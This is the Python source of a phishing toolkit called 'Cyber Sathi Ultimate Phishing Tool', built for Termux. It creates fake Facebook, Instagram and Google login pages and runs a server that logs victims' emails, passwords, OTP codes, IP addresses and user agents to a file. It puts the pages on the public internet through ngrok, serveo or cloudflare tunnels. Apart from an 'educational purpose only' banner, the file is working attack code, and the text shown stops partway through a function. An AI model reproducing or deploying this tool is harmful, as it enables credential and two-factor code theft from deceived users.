#!/usr/bin/env python3
"""
🔥 CYBER SATHI - Ultimate Phishing Tool v3.0
With Ngrok Token Support & Mobile Optimized
Enhanced for Termux & Android
"""

import os
import sys
import json
import time
import random
import string
import threading
import socket
import requests
import subprocess
import urllib.parse
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import configparser

# Configuration
VERSION = "3.0"
AUTHOR = "Cyber Sathi Team"
TEMPLATES_DIR = "templates"
DATA_DIR = "captured_data"
NGROK_DIR = "ngrok_tunnels"
CONFIG_FILE = "config.ini"

# Colors for terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    BLACK = '\033[30m'  # Added BLACK color
    
    # Background colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

# Create necessary directories
def setup_directories():
    """Create required directories"""
    directories = [TEMPLATES_DIR, DATA_DIR, NGROK_DIR]
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)
            print(f"{Colors.GREEN}[✓] Created directory: {directory}{Colors.RESET}")

# Global variables
collected_data = []
current_server = None
is_running = False
selected_template = ""
ngrok_url = ""
ngrok_auth_token = ""
config = configparser.ConfigParser()

def load_config():
    """Load or create configuration"""
    if os.path.exists(CONFIG_FILE):
        config.read(CONFIG_FILE)
        if 'NGROK' in config and 'auth_token' in config['NGROK']:
            global ngrok_auth_token
            ngrok_auth_token = config['NGROK']['auth_token']
            return True
    return False

def save_config():
    """Save configuration to file"""
    if 'NGROK' not in config:
        config['NGROK'] = {}
    if ngrok_auth_token:
        config['NGROK']['auth_token'] = ngrok_auth_token
    
    with open(CONFIG_FILE, 'w') as f:
        config.write(f)

def print_banner():
    """Print fancy optimized banner for mobile"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}{"═"*65}{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}╔{'═'*63}╗{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║{' '*63}║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║   ██████╗██╗   ██╗██████╗ ███████╗██████╗              ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗             ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝             ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗             ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║             ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝             ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║{' '*63}║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║      ███████╗ █████╗ ████████╗██╗  ██╗██╗              ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║      ██╔════╝██╔══██╗╚══██╔══╝██║  ██║██║              ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║      ███████╗███████║   ██║   ███████║██║              ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║      ╚════██║██╔══██║   ██║   ██╔══██║██║              ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║      ███████║██║  ██║   ██║   ██║  ██║██║              ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║      ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝              ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║{' '*63}║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║    ╔══════════════════════════════════════════╗        ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║    ║      ULTIMATE PHISHING TOOL v{VERSION}     ║        ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║    ║      cyber Sathi help ek Hindustani        ║        ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║    ╚══════════════════════════════════════════╝        ║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}║{' '*63}║{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}╚{'═'*63}╝{Colors.RESET}
{Colors.BG_RED}{Colors.BOLD}{Colors.WHITE}{"═"*65}{Colors.RESET}

{Colors.BG_YELLOW}{Colors.BOLD}{Colors.BLACK}⚠  FOR EDUCATIONAL PURPOSE ONLY ⚠{Colors.RESET}
{Colors.YELLOW}⚠ Use only on systems you own or have permission!{Colors.RESET}
{Colors.CYAN}{'═'*65}{Colors.RESET}
"""
    print(banner)

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def check_ngrok_installed():
    """Check if ngrok is installed"""
    try:
        # Check multiple possible locations
        possible_paths = [
            'ngrok',
            './ngrok',
            '/data/data/com.termux/files/usr/bin/ngrok',
            '/usr/bin/ngrok',
            '/usr/local/bin/ngrok',
            'ngrok.exe'
        ]
        
        for path in possible_paths:
            try:
                result = subprocess.run([path, '--version'], 
                                      capture_output=True, text=True, 
                                      timeout=3)
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[✓] Ngrok found at: {path}{Colors.RESET}")
                    return True, path
            except:
                continue
        
        print(f"{Colors.RED}[✗] Ngrok not found in any standard location{Colors.RESET}")
        return False, None
        
    except Exception as e:
        print(f"{Colors.RED}[✗] Error checking ngrok: {e}{Colors.RESET}")
        return False, None

def setup_ngrok_auth():
    """Setup ngrok authentication token"""
    global ngrok_auth_token
    
    print(f"\n{Colors.CYAN}[+] Ngrok Authentication Setup{Colors.RESET}")
    print(f"{Colors.WHITE}{'─'*55}{Colors.RESET}")
    
    if ngrok_auth_token:
        print(f"{Colors.GREEN}[✓] Current token: {ngrok_auth_token[:10]}...{Colors.RESET}")
        change = input(f"{Colors.YELLOW}[?] Change token? (y/N): {Colors.RESET}").lower()
        if change != 'y':
            return True
    
    print(f"\n{Colors.YELLOW}[*] Get your ngrok auth token:{Colors.RESET}")
    print(f"{Colors.WHITE}1. Go to: https://dashboard.ngrok.com/auth{Colors.RESET}")
    print(f"{Colors.WHITE}2. Login/Create account{Colors.RESET}")
    print(f"{Colors.WHITE}3. Copy your authtoken{Colors.RESET}")
    print(f"{Colors.WHITE}{'─'*55}{Colors.RESET}")
    
    token = input(f"{Colors.YELLOW}[?] Enter ngrok auth token: {Colors.RESET}").strip()
    
    if not token:
        print(f"{Colors.RED}[✗] No token provided{Colors.RESET}")
        return False
    
    # Validate token format
    if len(token) < 20:
        print(f"{Colors.RED}[✗] Token seems too short{Colors.RESET}")
        return False
    
    # Try to configure ngrok with this token
    ngrok_installed, ngrok_path = check_ngrok_installed()
    
    if ngrok_installed:
        try:
            result = subprocess.run([ngrok_path, 'config', 'add-authtoken', token],
                                  capture_output=True, text=True,
                                  timeout=10)
            
            if result.returncode == 0:
                ngrok_auth_token = token
                save_config()
                print(f"{Colors.GREEN}[✓] Ngrok token configured successfully!{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}[✗] Failed to configure ngrok: {result.stderr}{Colors.RESET}")
                return False
        except Exception as e:
            print(f"{Colors.RED}[✗] Error configuring ngrok: {e}{Colors.RESET}")
            return False
    else:
        # Just save token for later use
        ngrok_auth_token = token
        save_config()
        print(f"{Colors.GREEN}[✓] Token saved. Install ngrok to use it.{Colors.RESET}")
        return True

def install_ngrok_termux():
    """Install ngrok in Termux"""
    print(f"\n{Colors.CYAN}[+] Installing Ngrok in Termux{Colors.RESET}")
    print(f"{Colors.WHITE}{'─'*55}{Colors.RESET}")
    
    print(f"{Colors.YELLOW}[*] Follow these steps:{Colors.RESET}")
    print(f"{Colors.WHITE}1. Update Termux:{Colors.RESET}")
    print(f"   {Colors.GREEN}pkg update && pkg upgrade{Colors.RESET}")
    print(f"{Colors.WHITE}2. Install wget:{Colors.RESET}")
    print(f"   {Colors.GREEN}pkg install wget -y{Colors.RESET}")
    print(f"{Colors.WHITE}3. Download ngrok:{Colors.RESET}")
    print(f"   {Colors.GREEN}wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz{Colors.RESET}")
    print(f"{Colors.WHITE}4. Extract:{Colors.RESET}")
    print(f"   {Colors.GREEN}tar -xzvf ngrok-v3-stable-linux-arm64.tgz{Colors.RESET}")
    print(f"{Colors.WHITE}5. Make executable:{Colors.RESET}")
    print(f"   {Colors.GREEN}chmod +x ngrok{Colors.RESET}")
    print(f"{Colors.WHITE}6. Move to bin:{Colors.RESET}")
    print(f"   {Colors.GREEN}mv ngrok /data/data/com.termux/files/usr/bin/{Colors.RESET}")
    print(f"{Colors.WHITE}7. Verify:{Colors.RESET}")
    print(f"   {Colors.GREEN}ngrok --version{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}[!] IMPORTANT FOR TERMUX USERS:{Colors.RESET}")
    print(f"{Colors.RED}• Keep hotspot ON for ngrok to work{Colors.RESET}")
    print(f"{Colors.RED}• Or use mobile data{Colors.RESET}")
    print(f"{Colors.RED}• Termux internal network may block tunnels{Colors.RESET}")
    
    auto = input(f"\n{Colors.YELLOW}[?] Run automatic installation? (y/N): {Colors.RESET}").lower()
    
    if auto == 'y':
        try:
            commands = [
                'pkg update -y && pkg upgrade -y',
                'pkg install wget -y',
                'wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz',
                'tar -xzvf ngrok-v3-stable-linux-arm64.tgz',
                'chmod +x ngrok',
                'mv ngrok /data/data/com.termux/files/usr/bin/',
                'ngrok --version'
            ]
            
            for cmd in commands:
                print(f"\n{Colors.BLUE}[*] Running: {cmd}{Colors.RESET}")
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode != 0:
                    print(f"{Colors.RED}[✗] Error: {result.stderr}{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.GREEN}[✓] Success{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}[✗] Installation failed: {e}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

def check_internet_connection():
    """Check if device has internet connection"""
    try:
        response = requests.get('http://www.google.com', timeout=5)
        return True
    except:
        return False

def start_ngrok_tunnel(port, subdomain=None, region='in'):
    """Start ngrok tunnel with authentication"""
    global ngrok_url, ngrok_auth_token
    
    # Check ngrok
    ngrok_installed, ngrok_path = check_ngrok_installed()
    
    if not ngrok_installed:
        print(f"{Colors.RED}[✗] Ngrok not installed!{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Select 'Install Ngrok' from main menu{Colors.RESET}")
        return None
    
    # Check internet
    if not check_internet_connection():
        print(f"{Colors.RED}[✗] No internet connection!{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Turn ON mobile data or hotspot{Colors.RESET}")
        return None
    
    print(f"{Colors.BLUE}[*] Starting Ngrok tunnel...{Colors.RESET}")
    
    try:
        # Build command
        cmd = [ngrok_path, 'http', str(port), '--log=stdout']
        
        # Add region
        cmd.extend(['--region', region])
        
        # Add subdomain if provided
        if subdomain:
            cmd.extend(['--subdomain', subdomain])
        
        print(f"{Colors.GREEN}[✓] Command: {' '.join(cmd)}{Colors.RESET}")
        
        # Start ngrok process
        ngrok_proc = subprocess.Popen(cmd,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE,
                                     text=True,
                                     bufsize=1,
                                     universal_newlines=True)
        
        # Wait for tunnel
        print(f"{Colors.YELLOW}[*] Waiting for tunnel (10-15 seconds)...{Colors.RESET}")
        time.sleep(12)
        
        # Try to get tunnel URL
        max_attempts = 8
        for attempt in range(max_attempts):
            try:
                response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                if response.status_code == 200:
                    tunnels = response.json().get('tunnels', [])
                    for tunnel in tunnels:
                        if tunnel.get('proto') == 'https':
                            ngrok_url = tunnel.get('public_url')
                            print(f"\n{Colors.GREEN}{'═'*65}{Colors.RESET}")
                            print(f"{Colors.GREEN}{Colors.BOLD}[✓] NGROK TUNNEL CREATED!{Colors.RESET}")
                            print(f"{Colors.GREEN}[+] URL: {ngrok_url}{Colors.RESET}")
                            print(f"{Colors.GREEN}[+] Port: {port}{Colors.RESET}")
                            print(f"{Colors.GREEN}[+] Template: {selected_template}{Colors.RESET}")
                            print(f"{Colors.GREEN}{'═'*65}{Colors.RESET}")
                            
                            # Save tunnel info
                            tunnel_info = {
                                'url': ngrok_url,
                                'port': port,
                                'time': datetime.now().isoformat(),
                                'template': selected_template,
                                'region': region
                            }
                            
                            tunnel_file = f'{NGROK_DIR}/tunnel_{int(time.time())}.json'
                            with open(tunnel_file, 'w') as f:
                                json.dump(tunnel_info, f, indent=2)
                            
                            return ngrok_url
                time.sleep(2)
            except requests.exceptions.ConnectionError:
                print(f"{Colors.YELLOW}[*] Waiting for ngrok API ({attempt+1}/{max_attempts})...{Colors.RESET}")
                time.sleep(3)
                continue
            except Exception as e:
                print(f"{Colors.RED}[✗] Error getting tunnel: {e}{Colors.RESET}")
                break
        
        print(f"{Colors.RED}[✗] Could not establish ngrok tunnel{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Check internet connection and ngrok token{Colors.RESET}")
        return None
        
    except Exception as e:
        print(f"{Colors.RED}[✗] Ngrok error: {e}{Colors.RESET}")
        return None

def domain_options_menu():
    """Domain options menu without y/n questions"""
    print(f"\n{Colors.CYAN}[+] DOMAIN OPTIONS{Colors.RESET}")
    print(f"{Colors.WHITE}{'═'*55}{Colors.RESET}")
    print(f"{Colors.GREEN}[1] Ngrok Random URL (Free)")
    print(f"{Colors.YELLOW}[2] Ngrok Custom Subdomain (Pro)")
    print(f"{Colors.GREEN}[3] Serveo.net (Recommended - Free)")
    print(f"{Colors.GREEN}[4] Local Network Only")
    print(f"{Colors.GREEN}[5] Cloudflare Tunnel (Professional)")
    print(f"{Colors.WHITE}[6] Custom Domain{Colors.RESET}")
    print(f"{Colors.WHITE}{'═'*55}{Colors.RESET}")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select (1-6): {Colors.RESET}")
    
    if choice == '1':
        print(f"{Colors.YELLOW}[*] Ngrok Free selected{Colors.RESET}")
        return {'type': 'ngrok_random'}
    
    elif choice == '2':
        subdomain = input(f"{Colors.YELLOW}[?] Enter subdomain name: {Colors.RESET}")
        if subdomain:
            return {'type': 'ngrok_subdomain', 'subdomain': subdomain}
        else:
            print(f"{Colors.RED}[✗] No subdomain entered{Colors.RESET}")
            return {'type': 'ngrok_random'}
    
    elif choice == '3':
        print(f"{Colors.GREEN}[✓] Serveo.net selected{Colors.RESET}")
        return {'type': 'serveo'}
    
    elif choice == '4':
        print(f"{Colors.YELLOW}[*] Local network selected{Colors.RESET}")
        return {'type': 'local'}
    
    elif choice == '5':
        print(f"{Colors.GREEN}[✓] Cloudflare Tunnel selected{Colors.RESET}")
        return {'type': 'cloudflare'}
    
    elif choice == '6':
        domain = input(f"{Colors.YELLOW}[?] Enter your domain: {Colors.RESET}")
        if domain:
            return {'type': 'custom_domain', 'domain': domain}
        else:
            print(f"{Colors.RED}[✗] No domain entered{Colors.RESET}")
            return {'type': 'local'}
    
    else:
        print(f"{Colors.RED}[✗] Invalid option{Colors.RESET}")
        return {'type': 'ngrok_random'}

def setup_serveo_tunnel(port):
    """Setup Serveo tunnel"""
    print(f"\n{Colors.GREEN}[✓] SERVEO.NET INSTRUCTIONS{Colors.RESET}")
    print(f"{Colors.WHITE}{'─'*55}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Run this command in NEW terminal:{Colors.RESET}")
    print(f"{Colors.GREEN}ssh -R 80:localhost:{port} serveo.net{Colors.RESET}")
    print(f"{Colors.WHITE}{'─'*55}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Wait for connection{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Copy the URL shown (e.g., https://xxx.serveo.net){Colors.RESET}")
    
    auto = input(f"\n{Colors.YELLOW}[?] Run automatically? (Y/n): {Colors.RESET}").lower()
    
    if auto == 'n':
        return None
    
    try:
        print(f"{Colors.BLUE}[*] Starting Serveo...{Colors.RESET}")
        cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
        
        # Try to run in background
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        time.sleep(5)
        print(f"{Colors.GREEN}[✓] Serveo started in background{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Check other terminal for URL{Colors.RESET}")
        
        return "serveo.net"
        
    except Exception as e:
        print(f"{Colors.RED}[✗] Error: {e}{Colors.RESET}")
        return None

def setup_cloudflare_tunnel_guide(port):
    """Cloudflare tunnel guide"""
    print(f"\n{Colors.GREEN}[✓] CLOUDFLARE TUNNEL GUIDE{Colors.RESET}")
    print(f"{Colors.WHITE}{'═'*55}{Colors.RESET}")
    print(f"{Colors.YELLOW}Step 1: Install cloudflared{Colors.RESET}")
    print(f"{Colors.WHITE}Linux/Mac: curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared{Colors.RESET}")
    print(f"{Colors.WHITE}Termux: pkg install cloudflared{Colors.RESET}")
    print(f"\n{Colors.YELLOW}Step 2: Make executable{Colors.RESET}")
    print(f"{Colors.WHITE}chmod +x cloudflared{Colors.RESET}")
    print(f"\n{Colors.YELLOW}Step 3: Run tunnel{Colors.RESET}")
    print(f"{Colors.WHITE}./cloudflared tunnel --url http://localhost:{port}{Colors.RESET}")
    print(f"\n{Colors.GREEN}[✓] Benefits:{Colors.RESET}")
    print(f"{Colors.WHITE}• Completely free{Colors.RESET}")
    print(f"{Colors.WHITE}• No 'Visit Site' page{Colors.RESET}")
    print(f"{Colors.WHITE}• Custom domains{Colors.RESET}")
    print(f"{Colors.WHITE}• Fast & reliable{Colors.RESET}")
    print(f"{Colors.WHITE}{'═'*55}{Colors.RESET}")
    
    return None

# Template functions
def load_templates():
    """Load templates from templates directory"""
    templates = {}
    
    if not os.path.exists(TEMPLATES_DIR):
        print(f"{Colors.RED}[✗] Templates directory not found!{Colors.RESET}")
        return templates
    
    for file in os.listdir(TEMPLATES_DIR):
        if file.endswith('.html'):
            template_name = file.replace('.html', '')
            template_path = os.path.join(TEMPLATES_DIR, file)
            
            try:
                with open(template_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                    templates[template_name] = content
                    print(f"{Colors.GREEN}[✓] Loaded: {template_name}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[✗] Error loading {file}: {e}{Colors.RESET}")
    
    # Create default templates if none exist
    if not templates:
        create_default_templates()
        templates = load_templates()
    
    return templates

def create_default_templates():
    """Create default templates"""
    print(f"{Colors.YELLOW}[*] Creating default templates...{Colors.RESET}")
    
    # Facebook template
    facebook_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log in or Sign up</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; min-height: 100vh; padding: 20px; }
        .container { max-width: 400px; margin: 0 auto; padding-top: 50px; }
        .logo { color: #1877f2; font-size: 48px; font-weight: bold; text-align: center; margin-bottom: 20px; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
        .login-btn { background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; padding: 14px; width: 100%; margin: 10px 0; }
        .forgot-link { display: block; text-align: center; margin: 15px 0; color: #1877f2; text-decoration: none; }
        .create-btn { background: #42b72a; color: white; border: none; border-radius: 6px; padding: 14px; width: 100%; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <div class="login-box">
            <form method="POST">
                <input type="text" name="email" placeholder="Email or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <a href="#" class="forgot-link">Forgotten password?</a>
            <hr>
            <button class="create-btn">Create New Account</button>
        </div>
    </div>
</body>
</html>'''
    
    # Instagram template
    instagram_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        @import url('https://fonts.cdnfonts.com/css/billabong');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, sans-serif; background: #fafafa; min-height: 100vh; padding: 20px; }
        .container { max-width: 350px; margin: 0 auto; padding-top: 30px; }
        .logo { font-family: 'Billabong', cursive; font-size: 50px; text-align: center; margin-bottom: 30px; }
        .login-form { background: white; border: 1px solid #dbdbdb; padding: 30px; }
        input { width: 100%; padding: 12px; margin: 6px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; }
        .login-btn { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; margin-top: 15px; }
        .divider { text-align: center; margin: 20px 0; color: #8e8e8e; }
        .fb-login { display: block; text-align: center; color: #385185; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <div class="login-form">
            <form method="POST">
                <input type="text" name="username" placeholder="Username or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <div class="divider">OR</div>
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" style="display:block; text-align:center; color: #00376b; font-size: 12px;">Forgot password?</a>
        </div>
    </div>
</body>
</html>'''
    
    # Google template
    google_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Google</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; }
        .header { text-align: right; padding: 15px; }
        .header a { margin: 0 8px; color: #202124; text-decoration: none; font-size: 13px; }
        .main { text-align: center; padding: 100px 20px 20px; }
        .logo { font-size: 60px; margin-bottom: 20px; }
        .blue { color: #4285f4; }
        .red { color: #ea4335; }
        .yellow { color: #fbbc05; }
        .green { color: #34a853; }
        .search-box { width: 100%; max-width: 500px; padding: 15px; border: 1px solid #dfe1e5; border-radius: 24px; margin: 20px auto; font-size: 16px; }
        .buttons button { background: #f8f9fa; border: 1px solid #f8f9fa; padding: 10px 15px; margin: 5px; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="header">
        <a href="#">Gmail</a>
        <a href="#">Images</a>
        <button style="background: #1a73e8; color: white; border: none; padding: 8px 20px; border-radius: 4px;">Sign in</button>
    </div>
    <div class="main">
        <div class="logo">
            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span>
            <span class="blue">g</span><span class="green">l</span><span class="red">e</span>
        </div>
        <form method="POST">
            <input type="text" name="query" class="search-box" placeholder="Search Google or type URL">
            <div class="buttons">
                <button type="submit">Google Search</button>
                <button type="button">I'm Feeling Lucky</button>
            </div>
        </form>
    </div>
</body>
</html>'''
    
    # Save templates
    templates = {
        'facebook': facebook_html,
        'instagram': instagram_html,
        'google': google_html
    }
    
    for filename, content in templates.items():
        filepath = os.path.join(TEMPLATES_DIR, f"{filename}.html")
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
    
    print(f"{Colors.GREEN}[✓] Default templates created{Colors.RESET}")

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global selected_template
        
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            templates = load_templates()
            if selected_template in templates:
                self.wfile.write(templates[selected_template].encode('utf-8'))
            else:
                self.wfile.write(b'<h1>Template not found</h1>')
        
        elif self.path == '/success':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            success_page = '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Success</title>
                <style>
                    body { font-family: Arial; text-align: center; padding: 50px; background: #f0f2f5; }
                    .success { background: white; padding: 40px; border-radius: 10px; display: inline-block; }
                    .check { color: #42b72a; font-size: 60px; }
                    h1 { color: #1c1e21; }
                </style>
            </head>
            <body>
                <div class="success">
                    <div class="check">✓</div>
                    <h1>Login Successful!</h1>
                    <p>Redirecting...</p>
                </div>
                <script>
                    setTimeout(() => window.location.href = "https://google.com", 2000);
                </script>
            </body>
            </html>
            '''
            self.wfile.write(success_page.encode('utf-8'))
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        global collected_data
        
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            parsed_data = urllib.parse.parse_qs(post_data)
            credentials = {}
            
            for key in ['email', 'username', 'password', 'phone', 'login', 'query', 'digit1', 'digit2', 'digit3', 'digit4', 'digit5', 'digit6']:
                if key in parsed_data:
                    credentials[key] = parsed_data[key][0]
            
            # Combine OTP
            if 'digit1' in credentials and 'digit6' in credentials:
                otp = ''.join([credentials.get(f'digit{i}', '') for i in range(1, 7)])
                if otp:
                    credentials['otp'] = otp
            
            # Client info
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            entry = {
                'timestamp': timestamp,
                'ip': client_ip,
                'user_agent': user_agent,
                'template': selected_template,
                'credentials': credentials
            }
            
            collected_data.append(entry)
            
            # Save to file
            log_file = os.path.join(DATA_DIR, 'captured_data.json')
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(json.dumps(entry, ensure_ascii=False) + '\n')
            
            print(f"{Colors.GREEN}[✓] Captured from {client_ip}: {credentials}{Colors.RESET}")
            
            # Redirect
            self.send_response(302)
            self.send_header('Location', '/success')
            self.end_headers()
            
        except Exception as e:
            print(f"{Colors.RED}[✗] POST error: {e}{Colors.RESET}")
            self.send_response(500)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

def start_phishing_server(template_name, port=8080, domain_config=None):
    """Start phishing server"""
    global current_server, is_running, selected_template, ngrok_url
    
    selected_template = template_name
    is_running = True
    
    server_address = ('0.0.0.0', port)
    current_server = HTTPServer(server_address, PhishingHandler)
    
    print(f"\n{Colors.GREEN}{'═'*65}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] STARTING PHISHING SERVER{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Template: {template_name}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Port: {port}{Colors.RESET}")
    
    local_ip = get_local_ip()
    print(f"{Colors.GREEN}[+] Local: http://{local_ip}:{port}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Local: http://localhost:{port}{Colors.RESET}")
    
    external_url = None
    
    if domain_config:
        if domain_config['type'] == 'ngrok_random':
            ngrok_url = start_ngrok_tunnel(port)
            if ngrok_url:
                external_url = ngrok_url
        
        elif domain_config['type'] == 'ngrok_subdomain':
            ngrok_url = start_ngrok_tunnel(port, domain_config.get('subdomain'))
            if ngrok_url:
                external_url = ngrok_url
        
        elif domain_config['type'] == 'serveo':
            external_url = setup_serveo_tunnel(port)
        
        elif domain_config['type'] == 'cloudflare':
            setup_cloudflare_tunnel_guide(port)
        
        elif domain_config['type'] == 'custom_domain':
            print(f"{Colors.YELLOW}[*] Configure domain to point to: {local_ip}:{port}{Colors.RESET}")
    
    print(f"\n{Colors.CYAN}[+] Server running!{Colors.RESET}")
    print(f"{Colors.CYAN}[+] Press Ctrl+C to stop{Colors.RESET}")
    print(f"{Colors.CYAN}[+] Waiting for credentials...{Colors.RESET}")
    print(f"{Colors.GREEN}{'═'*65}{Colors.RESET}\n")
    
    # Start server thread
    server_thread = threading.Thread(target=current_server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    
    try:
        while is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[✗] Stopping server...{Colors.RESET}")
    finally:
        is_running = False
        if current_server:
            current_server.shutdown()
        current_server = None
        
        show_captured_data()

def show_captured_data():
    """Display captured data"""
    global collected_data
    
    print(f"\n{Colors.CYAN}{'═'*65}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] CAPTURED DATA SUMMARY{Colors.RESET}")
    print(f"{Colors.CYAN}{'═'*65}{Colors.RESET}")
    
    if not collected_data:
        print(f"{Colors.YELLOW}[*] No data captured{Colors.RESET}")
        return
    
    total = len(collected_data)
    print(f"{Colors.GREEN}[+] Total captured: {total}{Colors.RESET}\n")
    
    for i, entry in enumerate(collected_data, 1):
